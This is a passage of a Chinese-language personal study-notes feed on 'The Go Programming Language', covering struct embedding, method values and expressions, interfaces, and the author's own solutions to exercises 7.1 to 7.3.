punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tred <span class=\"token operator\">:=</span> color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span>\n\tblue <span class=\"token operator\">:=</span> color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> ColoredPoint<span class=\"token punctuation\">{</span>Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> red<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">var</span> q <span class=\"token operator\">=</span> ColoredPoint<span class=\"token punctuation\">{</span>Point<span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> blue<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: 可以把ColoredPoint类型当作接收器来调用Point里的方法，即使ColoredPoint里没有声明这些方法</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"5\"</span>\n\tp<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tq<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"10\"</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>Point类的方法也被引入了ColoredPoint。用这种方式，内嵌可以使我们定义字段特别多的复杂类型，我们可以将字段先按小类型分组，然后定义小类型的方法，之后再把它们组合起来。</p>\n<p>一个ColoredPoint并不是一个Point，但他\"has a\"Point，并且它有从Point类里引入的Distance和ScaleBy方法。如果你喜欢从实现的角度来考虑问题，内嵌字段会指导编译器去生成额外的包装方法来委托已经声明好的方法，和下面的形式是等价的：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p ColoredPoint<span class=\"token punctuation\">)</span> <span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q Point<span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span>ColoredPoint<span class=\"token punctuation\">)</span> <span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span>factor <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    p<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>当Point.Distance被第一个包装方法调用时，它的接收器值是p.Point，而不是p。</p>\n<h3>在type中内嵌的匿名字段可以是某type的指针</h3>\n<p>在类型中内嵌的匿名字段也可能是一个命名类型的指针，这种情况下字段和方法会被间接地引入到当前的类型中</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> ColoredPoint <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token operator\">*</span>Point\n    Color color<span class=\"token punctuation\">.</span>RGBA\n<span class=\"token punctuation\">}</span>\n\np <span class=\"token operator\">:=</span> ColoredPoint<span class=\"token punctuation\">{</span><span class=\"token operator\">&amp;</span>Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> red<span class=\"token punctuation\">}</span>\nq <span class=\"token operator\">:=</span> ColoredPoint<span class=\"token punctuation\">{</span><span class=\"token operator\">&amp;</span>Point<span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> blue<span class=\"token punctuation\">}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">Distance</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"5\"</span>\nq<span class=\"token punctuation\">.</span>Point <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>Point                 <span class=\"token comment\">// p and q now share the same Point</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">ScaleBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>q<span class=\"token punctuation\">.</span>Point<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"{2 2} {2 2}\"</span>\n\n</code></pre></div><h3>一个struct类型可以有多个匿名字段</h3>\n<p>一个struct类型也可能会有多个匿名字段。我们将ColoredPoint定义为下面这样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> ColoredPoint <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    Point\n    color<span class=\"token punctuation\">.</span>RGBA\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>然后这种类型的值便会拥有Point和RGBA类型的所有方法，以及直接定义在ColoredPoint中的方法。</p>\n<h2>6.4. 方法值和方法表达式</h2>\n<p>如下，distanceFromP叫方法值，本质是一个函数，<code>var distanceFromP func(q Point) float64 = p. Distance</code></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\tp <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\n\tq <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">}</span>\n\tdistanceFromP <span class=\"token operator\">:=</span> p<span class=\"token punctuation\">.</span>Distance        <span class=\"token comment\">// method value</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">distanceFromP</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">// \"5\"</span>\n\t<span class=\"token keyword\">var</span> origin Point                   <span class=\"token comment\">// {0, 0}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">distanceFromP</span><span class=\"token punctuation\">(</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"2.23606797749979\", sqrt(5)</span>\n</code></pre></div><p>这样写会更简短点。</p>\n<p>如下distance是一个方法表达式，distance是一个方法表达式，<code>var distance func(Point, Point) float64 = Point. Distance</code>。写作<code>type.func</code>或者<code>(*type).func</code>，会返回一个函数“值”，这种函数会将其第一个参数用作接收器，</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span>\nq <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">}</span>\n\ndistance <span class=\"token operator\">:=</span> Point<span class=\"token punctuation\">.</span>Distance   <span class=\"token comment\">// method expression</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">distance</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"5\" //这里两个参数，第一个p是原本的接收器，后面的是原来方法的输入值</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%T\\n\"</span><span class=\"token punctuation\">,</span> distance<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"func(Point, Point) float64\"</span>\n</code></pre></div><h2>6.5. 示例：Bit数组</h2>\n<p>后面太难看进去了，以后再说</p>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "07. 接口",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch7.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch7.html",
      "summary": "07. 接口\n7.1. 接口是合约\nGo 语言中的接口是一种抽象类型，它定义了一组方法。任何类型只要实现了接口定义的所有方法，就称之为实现了该接口。接口可以用于定义行为的规范，从而实现代码的解耦和复用。\n接口是合约的意思是指，接口定义了一组方法的规范，就像一份合约一样，规定了某些类型必须遵守的行为。任何类型只要实现了接口定义的所有方法，就相当于签署了这...",
      "content_html": "\n<h2>7.1. 接口是合约</h2>\n<p>Go 语言中的接口是一种抽象类型，它定义了一组方法。任何类型只要实现了接口定义的所有方法，就称之为实现了该接口。接口可以用于定义行为的规范，从而实现代码的解耦和复用。</p>\n<p><strong>接口是合约</strong>的意思是指，接口定义了一组方法的规范，就像一份合约一样，规定了某些类型必须遵守的行为。任何类型只要实现了接口定义的所有方法，就相当于签署了这份合约，承诺会遵守约定的行为。</p>\n<p>在 Go 语言中，接口（interface）是一种类型，用于定义方法集合。通过接口，你可以定义一组方法的契约，并使不同的类型实现这些方法，从而实现多态性。</p>\n<p>下面是一个使用接口的简单示例：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token comment\">// 定义一个接口</span>\n<span class=\"token keyword\">type</span> Shape <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">Area</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 定义一个矩形类型</span>\n<span class=\"token keyword\">type</span> Rectangle <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    Width  <span class=\"token builtin\">float64</span>\n    Height <span class=\"token builtin\">float64</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 实现接口方法</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>r Rectangle<span class=\"token punctuation\">)</span> <span class=\"token function\">Area</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span>Width <span class=\"token operator\">*</span> r<span class=\"token punctuation\">.</span>Height\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 定义一个圆形类型</span>\n<span class=\"token keyword\">type</span> Circle <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    Radius <span class=\"token builtin\">float64</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 实现接口方法</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c Circle<span class=\"token punctuation\">)</span> <span class=\"token function\">Area</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">3.14</span> <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>Radius <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>Radius\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 创建矩形对象</span>\n    rectangle <span class=\"token operator\">:=</span> Rectangle<span class=\"token punctuation\">{</span>Width<span class=\"token punctuation\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> Height<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// 创建圆形对象</span>\n    circle <span class=\"token operator\">:=</span> Circle<span class=\"token punctuation\">{</span>Radius<span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 使用接口调用方法</span>\n    shapes <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>Shape<span class=\"token punctuation\">{</span>rectangle<span class=\"token punctuation\">,</span> circle<span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> shape <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> shapes <span class=\"token punctuation\">{</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Area:\"</span><span class=\"token punctuation\">,</span> shape<span class=\"token punctuation\">.</span><span class=\"token function\">Area</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上述示例中，我们定义了一个 <code>Shape</code> 接口，它包含一个 <code>Area()</code> 方法。然后，我们创建了两个类型 <code>Rectangle</code> 和 <code>Circle</code>，它们分别实现了 <code>Shape</code> 接口的 <code>Area()</code> 方法。</p>\n<p>在 <code>main</code> 函数中，我们创建了一个包含 <code>Shape</code> 接口的切片 <code>shapes</code>，并将 <code>rectangle</code> 和 <code>circle</code> 对象添加到切片中。然后，通过使用接口调用 <code>Area()</code> 方法，我们可以对不同的类型进行多态性操作，而无需关注具体的类型。</p>\n<p>运行该代码将输出矩形和圆形的面积。</p>\n<p>请注意，接口在 Go 语言中还有其他用途，如类型断言和空接口等。上述示例只是接口的一个基本用法示例。根据实际需求，你可以在代码中使用接口来达到更灵活和抽象的目的。</p>\n<p>接口在 Go 中有多个用途：</p>\n<ol>\n<li><strong>多态</strong>：接口允许不同的类型通过共享相同的行为来进行替换。</li>\n<li><strong>解耦</strong>：接口提供了一种方式来定义函数和方法应该使用的抽象类型，而不必关心具体的实现类型。</li>\n<li><strong>扩展性</strong>：通过接口，可以轻松地为现有的类型添加新的行为，而不需要修改原有类型的定义。</li>\n</ol>\n<h3>练习 7.1</h3>\n<p>使用来自ByteCounter的思路，实现一个针对单词和行数的计数器。你会发现bufio.ScanWords非常的有用。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// 练习 7.1： 使用来自ByteCounter的思路，实现一个针对单词和行数的计数器。你会发现bufio.ScanWords非常的有用。</span>\n\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bufio\"</span>\n\t<span class=\"token string\">\"bytes\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">type</span> WordCounter <span class=\"token builtin\">int</span>\n<span class=\"token keyword\">type</span> LineCounter <span class=\"token builtin\">int</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>WordCounter<span class=\"token punctuation\">)</span> <span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> sc <span class=\"token operator\">=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">.</span><span class=\"token function\">NewReader</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tsc<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span>bufio<span class=\"token punctuation\">.</span>ScanWords<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token operator\">*</span>c<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>LineCounter<span class=\"token punctuation\">)</span> <span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> sc <span class=\"token operator\">=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">.</span><span class=\"token function\">NewReader</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tsc<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span>bufio<span class=\"token punctuation\">.</span>ScanLines<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token operator\">*</span>c<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tstr <span class=\"token operator\">:=</span> <span class=\"token string\">\"hello world\\nfoo bar\\nbaz\\n\"</span>\n\t<span class=\"token keyword\">var</span> wc WordCounter\n\twc<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Word count:\"</span><span class=\"token punctuation\">,</span> wc<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">var</span> lc LineCounter\n\tlc<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Line count:\"</span><span class=\"token punctuation\">,</span> lc<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 7.2</h3>\n<p>写一个带有如下函数签名的函数CountingWriter，传入一个io.Writer接口类型，返回一个把原来的Writer封装在里面的新的Writer类型和一个表示新的写入字节数的int64类型指针。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">CountingWriter</span><span class=\"token punctuation\">(</span>w io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span>\n</code></pre></div><div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> countWriter <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n\tw io<span class=\"token punctuation\">.</span>Writer\n\tc <span class=\"token operator\">*</span><span class=\"token builtin\">int64</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c countWriter<span class=\"token punctuation\">)</span> <span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> sc <span class=\"token operator\">=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">.</span><span class=\"token function\">NewReader</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tsc<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span>bufio<span class=\"token punctuation\">.</span>ScanWords<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tn<span class=\"token operator\">++</span>\n\t\t<span class=\"token operator\">*</span>c<span class=\"token punctuation\">.</span>c<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">CountingWriter</span><span class=\"token punctuation\">(</span>w io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> c <span class=\"token builtin\">int64</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>countWriter<span class=\"token punctuation\">{</span>w<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>c\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 7.3</h3>\n<p><em>为在gopl.io/ch4/treesort（§4.4）中的</em>tree类型实现一个String方法去展示tree类型的值序列。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> tree <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n\tvalue       <span class=\"token builtin\">int</span>\n\tleft<span class=\"token punctuation\">,</span> right <span class=\"token operator\">*</span>tree\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>tree <span class=\"token operator\">*</span>tree<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> values <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span>\n\tvalues <span class=\"token operator\">=</span> <span class=\"token function\">appendValues</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">,</span> tree<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprint</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Sort sorts values in place.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">Sort</span><span class=\"token punctuation\">(</span>values <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>tree <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> root <span class=\"token operator\">*</span>tree\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> values <span class=\"token punctuation\">{</span>\n\t\troot <span class=\"token operator\">=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">appendValues</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> root\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// appendValues appends the elements of t to values in order</span>\n<span class=\"token comment\">// and returns the resulting slice.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">appendValues</span><span class=\"token punctuation\">(</span>values <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> t <span class=\"token operator\">*</span>tree<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> t <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tvalues <span class=\"token operator\">=</span> <span class=\"token function\">appendValues</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">)</span>\n\t\tvalues <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>value<span class=\"token 